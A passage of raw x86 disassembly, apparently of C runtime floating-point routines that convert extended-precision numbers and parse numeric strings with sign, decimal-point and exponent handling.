  42591c:	jne    0x425928
  42591e:	mov    eax,DWORD PTR [ebp-0xc]
  425921:	mov    DWORD PTR [edi+0x4],esi
  425924:	mov    DWORD PTR [edi],eax
  425926:	jmp    0x42592f
  425928:	cmp    eax,0x20
  42592b:	jne    0x42592f
  42592d:	mov    DWORD PTR [edi],esi
  42592f:	mov    ecx,DWORD PTR [ebp-0x4]
  425932:	mov    eax,ebx
  425934:	pop    edi
  425935:	pop    esi
  425936:	xor    ecx,ebp
  425938:	pop    ebx
  425939:	call   0x421878
  42593e:	mov    esp,ebp
  425940:	pop    ebp
  425941:	ret    
  425942:	push   ebp
  425943:	mov    ebp,esp
  425945:	sub    esp,0x44
  425948:	mov    eax,ds:0x4314e0
  42594d:	xor    eax,ebp
  42594f:	mov    DWORD PTR [ebp-0x4],eax
  425952:	mov    ecx,DWORD PTR [ebp+0x8]
  425955:	push   ebx
  425956:	push   esi
  425957:	push   edi
  425958:	movzx  eax,WORD PTR [ecx+0xa]
  42595c:	xor    ebx,ebx
  42595e:	mov    edi,DWORD PTR [ebp+0xc]
  425961:	mov    edx,eax
  425963:	and    eax,0x8000
  425968:	mov    DWORD PTR [ebp-0x40],edi
  42596b:	mov    DWORD PTR [ebp-0x44],eax
  42596e:	and    edx,0x7fff
  425974:	mov    eax,DWORD PTR [ecx+0x6]
  425977:	sub    edx,0x3fff
  42597d:	mov    DWORD PTR [ebp-0x10],eax
  425980:	mov    eax,DWORD PTR [ecx+0x2]
  425983:	mov    DWORD PTR [ebp-0xc],eax
  425986:	movzx  eax,WORD PTR [ecx]
  425989:	shl    eax,0x10
  42598c:	mov    DWORD PTR [ebp-0x20],edx
  42598f:	mov    DWORD PTR [ebp-0x8],eax
  425992:	cmp    edx,0xffffc001
  425998:	jne    0x4259bf
  42599a:	mov    esi,ebx
  42599c:	mov    eax,ebx
  42599e:	cmp    DWORD PTR [ebp+eax*4-0x10],ebx
  4259a2:	jne    0x4259af
  4259a4:	inc    eax
  4259a5:	cmp    eax,0x3
  4259a8:	jl     0x42599e
  4259aa:	jmp    0x425e68
  4259af:	xor    eax,eax
  4259b1:	lea    edi,[ebp-0x10]
  4259b4:	stos   DWORD PTR es:[edi],eax
  4259b5:	stos   DWORD PTR es:[edi],eax
  4259b6:	stos   DWORD PTR es:[edi],eax
  4259b7:	push   0x2
  4259b9:	pop    ebx
  4259ba:	jmp    0x425e65
  4259bf:	mov    eax,ds:0x4315d8
  4259c4:	lea    esi,[ebp-0x10]
  4259c7:	lea    edi,[ebp-0x1c]
  4259ca:	mov    DWORD PTR [ebp-0x24],edx
  4259cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259ce:	dec    eax
  4259cf:	mov    DWORD PTR [ebp-0x34],eax
  4259d2:	push   0x1f
  4259d4:	mov    DWORD PTR [ebp-0x2c],ebx
  4259d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259d8:	lea    ecx,[eax+0x1]
  4259db:	mov    eax,ecx
  4259dd:	cdq    
  4259de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259df:	pop    esi
  4259e0:	and    edx,esi
  4259e2:	add    edx,eax
  4259e4:	sar    edx,0x5
  4259e7:	mov    DWORD PTR [ebp-0x3c],edx
  4259ea:	and    ecx,0x8000001f
  4259f0:	jns    0x4259f7
  4259f2:	dec    ecx
  4259f3:	or     ecx,0xffffffe0
  4259f6:	inc    ecx
  4259f7:	sub    esi,ecx
  4259f9:	xor    eax,eax
  4259fb:	inc    eax
  4259fc:	mov    DWORD PTR [ebp-0x30],esi
  4259ff:	mov    ecx,esi
  425a01:	or     edi,0xffffffff
  425a04:	shl    eax,cl
  425a06:	push   0x3
  425a08:	pop    esi
  425a09:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425a0d:	je     0x425ab7
  425a13:	mov    eax,edi
  425a15:	shl    eax,cl
  425a17:	not    eax
  425a19:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425a1d:	jmp    0x425a23
  425a1f:	cmp    DWORD PTR [ebp+edx*4-0x10],ebx
  425a23:	jne    0x425a2f
  425a25:	inc    edx
  425a26:	cmp    edx,esi
  425a28:	jl     0x425a1f
  425a2a:	jmp    0x425ab4
  425a2f:	mov    eax,DWORD PTR [ebp-0x34]
  425a32:	cdq    
  425a33:	push   0x1f
  425a35:	pop    ecx
  425a36:	and    edx,ecx
  425a38:	add    edx,eax
  425a3a:	mov    eax,DWORD PTR [ebp-0x34]
  425a3d:	sar    edx,0x5
  425a40:	and    eax,0x8000001f
  425a45:	jns    0x425a4c
  425a47:	dec    eax
  425a48:	or     eax,0xffffffe0
  425a4b:	inc    eax
  425a4c:	sub    ecx,eax
  425a4e:	mov    DWORD PTR [ebp-0x2c],ebx
  425a51:	xor    eax,eax
  425a53:	inc    eax
  425a54:	shl    eax,cl
  425a56:	mov    DWORD PTR [ebp-0x38],eax
  425a59:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  425a5d:	mov    ecx,DWORD PTR [ebp-0x38]
  425a60:	add    ecx,eax
  425a62:	mov    DWORD PTR [ebp-0x28],ecx
  425a65:	cmp    ecx,eax
  425a67:	mov    eax,DWORD PTR [ebp-0x28]
  425a6a:	mov    ecx,ebx
  425a6c:	push   0xffffffff
  425a6e:	pop    edi
  425a6f:	jb     0x425a76
  425a71:	cmp    eax,DWORD PTR [ebp-0x38]
  425a74:	jae    0x425a7c
  425a76:	xor    ecx,ecx
  425a78:	inc    ecx
  425a79:	mov    DWORD PTR [ebp-0x2c],ecx
  425a7c:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  425a80:	dec    edx
  425a81:	js     0x425ab1
  425a83:	test   ecx,ecx
  425a85:	je     0x425aae
  425a87:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  425a8b:	mov    ecx,ebx
  425a8d:	mov    DWORD PTR [ebp-0x2c],ebx
  425a90:	lea    edi,[eax+0x1]
  425a93:	cmp    edi,eax
  425a95:	mov    DWORD PTR [ebp-0x28],edi
  425a98:	mov    eax,edi
  425a9a:	jb     0x425aa1
  425a9c:	cmp    eax,0x1
  425a9f:	jae    0x425aa7
  425aa1:	xor    ecx,ecx
  425aa3:	inc    ecx
  425aa4:	mov    DWORD PTR [ebp-0x2c],ecx
  425aa7:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  425aab:	dec    edx
  425aac:	jns    0x425a83
  425aae:	or     edi,0xffffffff
  425ab1:	mov    ecx,DWORD PTR [ebp-0x30]
  425ab4:	mov    edx,DWORD PTR [ebp-0x3c]
  425ab7:	mov    eax,edi
  425ab9:	shl    eax,cl
  425abb:	and    DWORD PTR [ebp+edx*4-0x10],eax
  425abf:	lea    eax,[edx+0x1]
  425ac2:	cmp    eax,esi
  425ac4:	jge    0x425ad7
  425ac6:	lea    edi,[ebp-0x10]
  425ac9:	mov    ecx,esi
  425acb:	lea    edi,[edi+eax*4]
  425ace:	sub    ecx,eax
  425ad0:	xor    eax,eax
  425ad2:	rep stos DWORD PTR es:[edi],eax
  425ad4:	or     edi,0xffffffff
  425ad7:	mov    ecx,DWORD PTR [ebp-0x20]
  425ada:	cmp    DWORD PTR [ebp-0x2c],ebx
  425add:	je     0x425ae0
  425adf:	inc    ecx
  425ae0:	mov    edx,DWORD PTR ds:0x4315d4
  425ae6:	mov    eax,edx
  425ae8:	sub    eax,DWORD PTR ds:0x4315d8
  425aee:	cmp    ecx,eax
  425af0:	jge    0x425b01
  425af2:	xor    eax,eax
  425af4:	lea    edi,[ebp-0x10]
  425af7:	stos   DWORD PTR es:[edi],eax
  425af8:	stos   DWORD PTR es:[edi],eax
  425af9:	stos   DWORD PTR es:[edi],eax
  425afa:	mov    esi,ebx
  425afc:	jmp    0x4259b7
  425b01:	cmp    ecx,edx
  425b03:	jg     0x425d22
  425b09:	sub    edx,DWORD PTR [ebp-0x24]
  425b0c:	lea    esi,[ebp-0x1c]
  425b0f:	mov    DWORD PTR [ebp-0x30],edx
  425b12:	lea    edi,[ebp-0x10]
  425b15:	mov    eax,edx
  425b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b18:	cdq    
  425b19:	and    edx,0x1f
  425b1c:	add    eax,edx
  425b1e:	sar    eax,0x5
  425b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b22:	mov    DWORD PTR [ebp-0x3c],eax
  425b25:	mov    eax,DWORD PTR [ebp-0x30]
  425b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b29:	and    eax,0x8000001f
  425b2e:	jns    0x425b35
  425b30:	dec    eax
  425b31:	or     eax,0xffffffe0
  425b34:	inc    eax
  425b35:	mov    DWORD PTR [ebp-0x30],eax
  425b38:	or     edi,0xffffffff
  425b3b:	mov    eax,edi
  425b3d:	mov    DWORD PTR [ebp-0x20],ebx
  425b40:	mov    edi,DWORD PTR [ebp-0x30]
  425b43:	mov    ecx,edi
  425b45:	shl    eax,cl
  425b47:	not    eax
  425b49:	push   0x20
  425b4b:	mov    DWORD PTR [ebp-0x28],eax
  425b4e:	pop    eax
  425b4f:	sub    eax,edi
  425b51:	push   0x3
  425b53:	mov    DWORD PTR [ebp-0x38],eax
  425b56:	pop    esi
  425b57:	mov    edx,DWORD PTR [ebp+ebx*4-0x10]
  425b5b:	mov    ecx,edi
  425b5d:	mov    eax,edx
  425b5f:	shr    edx,cl
  425b61:	or     edx,DWORD PTR [ebp-0x20]
  425b64:	and    eax,DWORD PTR [ebp-0x28]
  425b67:	mov    ecx,DWORD PTR [ebp-0x38]
  425b6a:	shl    eax,cl
  425b6c:	mov    DWORD PTR [ebp+ebx*4-0x10],edx
  425b70:	inc    ebx
  425b71:	mov    DWORD PTR [ebp-0x20],eax
  425b74:	cmp    ebx,esi
  425b76:	jl     0x425b57
  425b78:	mov    eax,DWORD PTR [ebp-0x3c]
  425b7b:	lea    edx,[ebp-0x8]
  425b7e:	shl    eax,0x2
  425b81:	xor    ebx,ebx
  425b83:	push   0x2
  425b85:	sub    edx,eax
  425b87:	or     edi,0xffffffff
  425b8a:	mov    eax,DWORD PTR [ebp-0x3c]
  425b8d:	pop    ecx
  425b8e:	cmp    ecx,eax
  425b90:	jl     0x425b9d
  425b92:	mov    eax,DWORD PTR [edx]
  425b94:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  425b98:	mov    eax,DWORD PTR [ebp-0x3c]
  425b9b:	jmp    0x425ba1
  425b9d:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  425ba1:	sub    edx,0x4
  425ba4:	dec    ecx
  425ba5:	jns    0x425b8e
  425ba7:	mov    ecx,DWORD PTR [ebp-0x34]
  425baa:	inc    ecx
  425bab:	mov    eax,ecx
  425bad:	cdq    
  425bae:	and    edx,0x1f
  425bb1:	add    edx,eax
  425bb3:	sar    edx,0x5
  425bb6:	mov    DWORD PTR [ebp-0x2c],edx
  425bb9:	and    ecx,0x8000001f
  425bbf:	jns    0x425bc6
  425bc1:	dec    ecx
  425bc2:	or     ecx,0xffffffe0
  425bc5:	inc    ecx
  425bc6:	push   0x1f
  425bc8:	pop    eax
  425bc9:	sub    eax,ecx
  425bcb:	mov    DWORD PTR [ebp-0x30],eax
  425bce:	xor    eax,eax
  425bd0:	mov    ecx,DWORD PTR [ebp-0x30]
  425bd3:	inc    eax
  425bd4:	shl    eax,cl
  425bd6:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425bda:	je     0x425c72
  425be0:	mov    eax,edi
  425be2:	shl    eax,cl
  425be4:	not    eax
  425be6:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425bea:	jmp    0x425bf0
  425bec:	cmp    DWORD PTR [ebp+edx*4-0x10],ebx
  425bf0:	jne    0x425bf9
  425bf2:	inc    edx
  425bf3:	cmp    edx,esi
  425bf5:	jl     0x425bec
  425bf7:	jmp    0x425c6f
  425bf9:	mov    edi,DWORD PTR [ebp-0x34]
  425bfc:	mov    eax,edi
  425bfe:	push   0x1f
  425c00:	cdq    
  425c01:	pop    ecx
  425c02:	and    edx,ecx
  425c04:	add    edx,eax
  425c06:	sar    edx,0x5
  425c09:	and    edi,0x8000001f
  425c0f:	jns    0x425c16
  425c11:	dec    edi
  425c12:	or     edi,0xffffffe0
  425c15:	inc    edi
  425c16:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  425c1a:	sub    ecx,edi
  425c1c:	xor    edi,edi
  425c1e:	inc    edi
  425c1f:	shl    edi,cl
  425c21:	mov    ecx,ebx
  425c23:	mov    DWORD PTR [ebp-0x24],edi
  425c26:	add    edi,eax
  425c28:	mov    DWORD PTR [ebp-0x20],edi
  425c2b:	cmp    edi,eax
  425c2d:	mov    eax,DWORD PTR [ebp-0x20]
  425c30:	push   0xffffffff
  425c32:	pop    edi
  425c33:	jb     0x425c3a
  425c35:	cmp    eax,DWORD PTR [ebp-0x24]
  425c38:	jae    0x425c3d
  425c3a:	xor    ecx,ecx
  425c3c:	inc    ecx
  425c3d:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  425c41:	dec    edx
  425c42:	js     0x425c6c
  425c44:	test   ecx,ecx
  425c46:	je     0x425c69
  425c48:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  425c4c:	mov    ecx,ebx
  425c4e:	lea    edi,[eax+0x1]
  425c51:	cmp    edi,eax
  425c53:	mov    DWORD PTR [ebp-0x20],edi
  425c56:	mov    eax,edi
  425c58:	jb     0x425c5f
  425c5a:	cmp    eax,0x1
  425c5d:	jae    0x425c62
  425c5f:	xor    ecx,ecx
  425c61:	inc    ecx
  425c62:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  425c66:	dec    edx
  425c67:	jns    0x425c44
  425c69:	or     edi,0xffffffff
  425c6c:	mov    ecx,DWORD PTR [ebp-0x30]
  425c6f:	mov    edx,DWORD PTR [ebp-0x2c]
  425c72:	mov    eax,edi
  425c74:	shl    eax,cl
  425c76:	and    DWORD PTR [ebp+edx*4-0x10],eax
  425c7a:	inc    edx
  425c7b:	cmp    edx,esi
  425c7d:	jge    0x425c90
  425c7f:	lea    edi,[ebp-0x10]
  425c82:	mov    ecx,esi
  425c84:	lea    edi,[edi+edx*4]
  425c87:	sub    ecx,edx
  425c89:	xor    eax,eax
  425c8b:	rep stos DWORD PTR es:[edi],eax
  425c8d:	or     edi,0xffffffff
  425c90:	mov    ecx,DWORD PTR ds:0x4315dc
  425c96:	inc    ecx
  425c97:	mov    eax,ecx
  425c99:	cdq    
  425c9a:	and    edx,0x1f
  425c9d:	add    eax,edx
  425c9f:	sar    eax,0x5
  425ca2:	mov    DWORD PTR [ebp-0x28],eax
  425ca5:	and    ecx,0x8000001f
  425cab:	jns    0x425cb2
  425cad:	dec    ecx
  425cae:	or     ecx,0xffffffe0
  425cb1:	inc    ecx
  425cb2:	mov    DWORD PTR [ebp-0x24],ecx
  425cb5:	mov    eax,ebx
  425cb7:	shl    edi,cl
  425cb9:	push   0x20
  425cbb:	mov    DWORD PTR [ebp-0x20],ebx
  425cbe:	not    edi
  425cc0:	mov    ebx,DWORD PTR [ebp-0x24]
  425cc3:	pop    ecx
  425cc4:	sub    ecx,ebx
  425cc6:	mov    DWORD PTR [ebp-0x34],eax
  425cc9:	mov    DWORD PTR [ebp-0x24],ecx
  425ccc:	mov    edx,DWORD PTR [ebp+eax*4-0x10]
  425cd0:	mov    ecx,ebx
  425cd2:	mov    eax,edx
  425cd4:	shr    edx,cl
  425cd6:	mov    ecx,DWORD PTR [ebp-0x34]
  425cd9:	and    eax,edi
  425cdb:	or     edx,DWORD PTR [ebp-0x20]
  425cde:	mov    DWORD PTR [ebp+ecx*4-0x10],edx
  425ce2:	mov    ecx,DWORD PTR [ebp-0x24]
  425ce5:	shl    eax,cl
  425ce7:	mov    DWORD PTR [ebp-0x20],eax
  425cea:	mov    eax,DWORD PTR [ebp-0x34]
  425ced:	inc    eax
  425cee:	mov    DWORD PTR [ebp-0x34],eax
  425cf1:	cmp    eax,esi
  425cf3:	jl     0x425ccc
  425cf5:	mov    esi,DWORD PTR [ebp-0x28]
  425cf8:	lea    edx,[ebp-0x8]
  425cfb:	mov    eax,esi
  425cfd:	shl    eax,0x2
  425d00:	push   0x2
  425d02:	sub    edx,eax
  425d04:	xor    ebx,ebx
  425d06:	pop    ecx
  425d07:	cmp    ecx,esi
  425d09:	jl     0x425d13
  425d0b:	mov    eax,DWORD PTR [edx]
  425d0d:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  425d11:	jmp    0x425d17
  425d13:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  425d17:	sub    edx,0x4
  425d1a:	dec    ecx
  425d1b:	jns    0x425d07
  425d1d:	jmp    0x425afa
  425d22:	cmp    ecx,DWORD PTR ds:0x4315d0
  425d28:	jl     0x425dd0
  425d2e:	mov    ecx,DWORD PTR ds:0x4315dc
  425d34:	lea    edi,[ebp-0x10]
  425d37:	xor    eax,eax
  425d39:	stos   DWORD PTR es:[edi],eax
  425d3a:	stos   DWORD PTR es:[edi],eax
  425d3b:	stos   DWORD PTR es:[edi],eax
  425d3c:	mov    eax,ecx
  425d3e:	or     DWORD PTR [ebp-0x10],0x80000000
  425d45:	cdq    
  425d46:	and    edx,0x1f
  425d49:	add    eax,edx
  425d4b:	sar    eax,0x5
  425d4e:	mov    DWORD PTR [ebp-0x34],eax
  425d51:	and    ecx,0x8000001f
  425d57:	jns    0x425d5e
  425d59:	dec    ecx
  425d5a:	or     ecx,0xffffffe0
  425d5d:	inc    ecx
  425d5e:	or     edi,0xffffffff
  425d61:	mov    DWORD PTR [ebp-0x38],ecx
  425d64:	push   0x20
  425d66:	shl    edi,cl
  425d68:	pop    eax
  425d69:	sub    eax,ecx
  425d6b:	mov    DWORD PTR [ebp-0x20],ebx
  425d6e:	not    edi
  425d70:	mov    DWORD PTR [ebp-0x28],eax
  425d73:	mov    edx,DWORD PTR [ebp+ebx*4-0x10]
  425d77:	mov    eax,edx
  425d79:	shr    edx,cl
  425d7b:	and    eax,edi
  425d7d:	or     edx,DWORD PTR [ebp-0x20]
  425d80:	mov    ecx,DWORD PTR [ebp-0x28]
  425d83:	shl    eax,cl
  425d85:	mov    ecx,DWORD PTR [ebp-0x38]
  425d88:	mov    DWORD PTR [ebp+ebx*4-0x10],edx
  425d8c:	inc    ebx
  425d8d:	mov    DWORD PTR [ebp-0x20],eax
  425d90:	cmp    ebx,esi
  425d92:	jl     0x425d73
  425d94:	mov    esi,DWORD PTR [ebp-0x34]
  425d97:	lea    edx,[ebp-0x8]
  425d9a:	mov    eax,esi
  425d9c:	shl    eax,0x2
  425d9f:	push   0x2
  425da1:	sub    edx,eax
  425da3:	xor    ebx,ebx
  425da5:	pop    ecx
  425da6:	cmp    ecx,esi
  425da8:	jl     0x425db2
  425daa:	mov    eax,DWORD PTR [edx]
  425dac:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  425db0:	jmp    0x425db6
  425db2:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  425db6:	sub    edx,0x4
  425db9:	dec    ecx
  425dba:	jns    0x425da6
  425dbc:	mov    esi,DWORD PTR ds:0x4315e4
  425dc2:	xor    ebx,ebx
  425dc4:	add    esi,DWORD PTR ds:0x4315d0
  425dca:	inc    ebx
  425dcb:	jmp    0x425e65
  425dd0:	mov    esi,DWORD PTR ds:0x4315e4
  425dd6:	and    DWORD PTR [ebp-0x10],0x7fffffff
  425ddd:	add    esi,ecx
  425ddf:	mov    ecx,DWORD PTR ds:0x4315dc
  425de5:	mov    eax,ecx
  425de7:	cdq    
  425de8:	and    edx,0x1f
  425deb:	mov    DWORD PTR [ebp-0x38],esi
  425dee:	add    eax,edx
  425df0:	sar    eax,0x5
  425df3:	mov    DWORD PTR [ebp-0x28],eax
  425df6:	and    ecx,0x8000001f
  425dfc:	jns    0x425e03
  425dfe:	dec    ecx
  425dff:	or     ecx,0xffffffe0
  425e02:	inc    ecx
  425e03:	push   0x20
  425e05:	mov    DWORD PTR [ebp-0x20],ebx
  425e08:	mov    esi,ebx
  425e0a:	shl    edi,cl
  425e0c:	mov    ebx,ecx
  425e0e:	pop    eax
  425e0f:	sub    eax,ebx
  425e11:	mov    DWORD PTR [ebp-0x24],ecx
  425e14:	not    edi
  425e16:	mov    DWORD PTR [ebp-0x24],eax
  425e19:	mov    edx,DWORD PTR [ebp+esi*4-0x10]
  425e1d:	mov    ecx,ebx
  425e1f:	mov    eax,edx
  425e21:	shr    edx,cl
  425e23:	or     edx,DWORD PTR [ebp-0x20]
  425e26:	and    eax,edi
  425e28:	mov    ecx,DWORD PTR [ebp-0x24]
  425e2b:	shl    eax,cl
  425e2d:	mov    DWORD PTR [ebp+esi*4-0x10],edx
  425e31:	inc    esi
  425e32:	mov    DWORD PTR [ebp-0x20],eax
  425e35:	cmp    esi,0x3
  425e38:	jl     0x425e19
  425e3a:	mov    edi,DWORD PTR [ebp-0x28]
  425e3d:	lea    edx,[ebp-0x8]
  425e40:	mov    esi,DWORD PTR [ebp-0x38]
  425e43:	mov    eax,edi
  425e45:	shl    eax,0x2
  425e48:	push   0x2
  425e4a:	sub    edx,eax
  425e4c:	xor    ebx,ebx
  425e4e:	pop    ecx
  425e4f:	cmp    ecx,edi
  425e51:	jl     0x425e5b
  425e53:	mov    eax,DWORD PTR [edx]
  425e55:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  425e59:	jmp    0x425e5f
  425e5b:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  425e5f:	sub    edx,0x4
  425e62:	dec    ecx
  425e63:	jns    0x425e4f
  425e65:	mov    edi,DWORD PTR [ebp-0x40]
  425e68:	push   0x1f
  425e6a:	pop    eax
  425e6b:	sub    eax,DWORD PTR ds:0x4315dc
  425e71:	mov    ecx,eax
  425e73:	mov    eax,DWORD PTR [ebp-0x44]
  425e76:	shl    esi,cl
  425e78:	neg    eax
  425e7a:	sbb    eax,eax
  425e7c:	and    eax,0x80000000
  425e81:	or     esi,eax
  425e83:	mov    eax,ds:0x4315e0
  425e88:	or     esi,DWORD PTR [ebp-0x10]
  425e8b:	cmp    eax,0x40
  425e8e:	jne    0x425e9a
  425e90:	mov    eax,DWORD PTR [ebp-0xc]
  425e93:	mov    DWORD PTR [edi+0x4],esi
  425e96:	mov    DWORD PTR [edi],eax
  425e98:	jmp    0x425ea1
  425e9a:	cmp    eax,0x20
  425e9d:	jne    0x425ea1
  425e9f:	mov    DWORD PTR [edi],esi
  425ea1:	mov    ecx,DWORD PTR [ebp-0x4]
  425ea4:	mov    eax,ebx
  425ea6:	pop    edi
  425ea7:	pop    esi
  425ea8:	xor    ecx,ebp
  425eaa:	pop    ebx
  425eab:	call   0x421878
  425eb0:	mov    esp,ebp
  425eb2:	pop    ebp
  425eb3:	ret    
  425eb4:	push   ebp
  425eb5:	mov    ebp,esp
  425eb7:	sub    esp,0x80
  425ebd:	mov    eax,ds:0x4314e0
  425ec2:	xor    eax,ebp
  425ec4:	mov    DWORD PTR [ebp-0x4],eax
  425ec7:	mov    eax,DWORD PTR [ebp+0x8]
  425eca:	mov    DWORD PTR [ebp-0x80],eax
  425ecd:	mov    eax,DWORD PTR [ebp+0xc]
  425ed0:	mov    DWORD PTR [ebp-0x68],eax
  425ed3:	xor    eax,eax
  425ed5:	push   ebx
  425ed6:	xor    ebx,ebx
  425ed8:	inc    eax
  425ed9:	push   esi
  425eda:	mov    DWORD PTR [ebp-0x6c],eax
  425edd:	mov    esi,ebx
  425edf:	mov    eax,ebx
  425ee1:	mov    DWORD PTR [ebp-0x70],ebx
  425ee4:	push   edi
  425ee5:	lea    edi,[ebp-0x20]
  425ee8:	mov    DWORD PTR [ebp-0x4c],ebx
  425eeb:	mov    DWORD PTR [ebp-0x60],ebx
  425eee:	mov    DWORD PTR [ebp-0x5c],ebx
  425ef1:	mov    DWORD PTR [ebp-0x64],ebx
  425ef4:	mov    DWORD PTR [ebp-0x54],ebx
  425ef7:	cmp    DWORD PTR [ebp+0x24],eax
  425efa:	jne    0x425f13
  425efc:	call   0x41fb32
  425f01:	mov    DWORD PTR [eax],0x16
  425f07:	call   0x422622
  425f0c:	xor    eax,eax
  425f0e:	jmp    0x42661b
  425f13:	mov    edx,DWORD PTR [ebp+0x10]
  425f16:	mov    ecx,edx
  425f18:	mov    DWORD PTR [ebp-0x50],ecx
  425f1b:	mov    cl,BYTE PTR [edx]
  425f1d:	cmp    cl,0x20
  425f20:	je     0x425f31
  425f22:	cmp    cl,0x9
  425f25:	je     0x425f31
  425f27:	cmp    cl,0xa
  425f2a:	je     0x425f31
  425f2c:	cmp    cl,0xd
  425f2f:	jne    0x425f34
  425f31:	inc    edx
  425f32:	jmp    0x425f1b
  425f34:	mov    cl,BYTE PTR [edx]
  425f36:	inc    edx
  425f37:	mov    BYTE PTR [ebp-0x55],cl
  425f3a:	cmp    eax,0xb
  425f3d:	ja     0x4261be
  425f43:	jmp    DWORD PTR [eax*4+0x42662c]
  425f4a:	lea    eax,[ecx-0x31]
  425f4d:	cmp    al,0x8
  425f4f:	ja     0x425f57
  425f51:	push   0x3
  425f53:	pop    eax
  425f54:	dec    edx
  425f55:	jmp    0x425f34
  425f57:	mov    eax,DWORD PTR [ebp+0x24]
  425f5a:	mov    eax,DWORD PTR [eax]
  425f5c:	mov    eax,DWORD PTR [eax+0x84]
  425f62:	mov    eax,DWORD PTR [eax]
  425f64:	cmp    cl,BYTE PTR [eax]
  425f66:	jne    0x425f6d
  425f68:	push   0x5
  425f6a:	pop    eax
  425f6b:	jmp    0x425f34
  425f6d:	movsx  eax,cl
  425f70:	sub    eax,0x2b
  425f73:	je     0x425f94
  425f75:	dec    eax
  425f76:	dec    eax
  425f77:	je     0x425f87
  425f79:	sub    eax,0x3
  425f7c:	jne    0x426210
  425f82:	xor    eax,eax
  425f84:	inc    eax
  425f85:	jmp    0x425f34
  425f87:	push   0x2
  425f89:	mov    ecx,0x8000
  425f8e:	pop    eax
  425f8f:	mov    DWORD PTR [ebp-0x70],ecx
  425f92:	jmp    0x425f34
  425f94:	push   0x2
  425f96:	pop    eax
  425f97:	mov    DWORD PTR [ebp-0x70],ebx
  425f9a:	jmp    0x425f34
  425f9c:	xor    eax,eax
  425f9e:	inc    eax
  425f9f:	mov    DWORD PTR [ebp-0x60],eax
  425fa2:	lea    eax,[ecx-0x31]
  425fa5:	cmp    al,0x8
  425fa7:	jbe    0x425f51
  425fa9:	mov    eax,DWORD PTR [ebp+0x24]
  425fac:	mov    eax,DWORD PTR [eax]
  425fae:	mov    eax,DWORD PTR [eax+0x84]
  425fb4:	mov    eax,DWORD PTR [eax]
  425fb6:	cmp    cl,BYTE PTR [eax]
  425fb8:	jne    0x425fbe
  425fba:	push   0x4
  425fbc:	jmp    0x425f6a
  425fbe:	cmp    cl,0x2b
  425fc1:	je     0x425fee
  425fc3:	cmp    cl,0x2d
  425fc6:	je     0x425fee
  425fc8:	cmp    cl,0x30
  425fcb:	je     0x425f82
  425fcd:	cmp    cl,0x43
  425fd0:	jle    0x426210
  425fd6:	cmp    cl,0x45
  425fd9:	jle    0x425fe7
  425fdb:	sub    cl,0x64
  425fde:	cmp    cl,0x1
  425fe1:	ja     0x426210
  425fe7:	push   0x6
  425fe9:	jmp    0x425f6a
  425fee:	dec    edx
  425fef:	push   0xb
  425ff1:	jmp    0x425f6a
  425ff6:	lea    eax,[ecx-0x31]
  425ff9:	cmp    al,0x8
  425ffb:	jbe    0x425f51
  426001:	mov    eax,DWORD PTR [ebp+0x24]
  426004:	mov    eax,DWORD PTR [eax]
  426006:	mov    eax,DWORD PTR [eax+0x84]
  42600c:	mov    eax,DWORD PTR [eax]
  42600e:	cmp    cl,BYTE PTR [eax]
  426010:	je     0x425f68
  426016:	cmp    cl,0x30
  426019:	je     0x425f82
  42601f:	mov    edx,DWORD PTR [ebp-0x50]
  426022:	jmp    0x426211
  426027:	xor    eax,eax
  426029:	inc    eax
  42602a:	mov    DWORD PTR [ebp-0x60],eax
  42602d:	cmp    cl,0x30
  426030:	jl     0x42605c
  426032:	mov    eax,DWORD PTR [ebp-0x4c]
  426035:	mov    esi,DWORD PTR [ebp-0x54]
  426038:	cmp    cl,0x39
  42603b:	jg     0x426054
  42603d:	cmp    eax,0x19
  426040:	jae    0x42604b
  426042:	sub    cl,0x30
  426045:	inc    eax
  426046:	mov    BYTE PTR [edi],cl
  426048:	inc    edi
  426049:	jmp    0x42604c
  42604b:	inc    esi
  42604c:	mov    cl,BYTE PTR [edx]
  42604e:	inc    edx
  42604f:	cmp    cl,0x30
  426052:	jge    0x426038
  426054:	mov    DWORD PTR [ebp-0x54],esi
  426057:	mov    esi,ebx
  426059:	mov    DWORD PTR [ebp-0x4c],eax
  42605c:	mov    eax,DWORD PTR [ebp+0x24]
  42605f:	mov    eax,DWORD PTR [eax]
  426061:	mov    eax,DWORD PTR [eax+0x84]
  426067:	mov    eax,DWORD PTR [eax]
  426069:	cmp    cl,BYTE PTR [eax]
  42606b:	je     0x425fba
  426071:	cmp    cl,0x2b
  426074:	je     0x425fee
  42607a:	cmp    cl,0x2d
  42607d:	je     0x425fee
  426083:	jmp    0x425fcd
  426088:	xor    eax,eax
  42608a:	inc    eax
  42608b:	mov    DWORD PTR [ebp-0x60],eax
  42608e:	mov    DWORD PTR [ebp-0x5c],eax
  426091:	mov    eax,DWORD PTR [ebp-0x4c]
  426094:	test   eax,eax
  426096:	jne    0x4260af
  426098:	cmp    cl,0x30
  42609b:	jne    0x4260b2
  42609d:	mov    eax,DWORD PTR [ebp-0x54]
  4260a0:	mov    cl,BYTE PTR [edx]
  4260a2:	dec    eax
  4260a3:	inc    edx
  4260a4:	cmp    cl,0x30
  4260a7:	je     0x4260a0
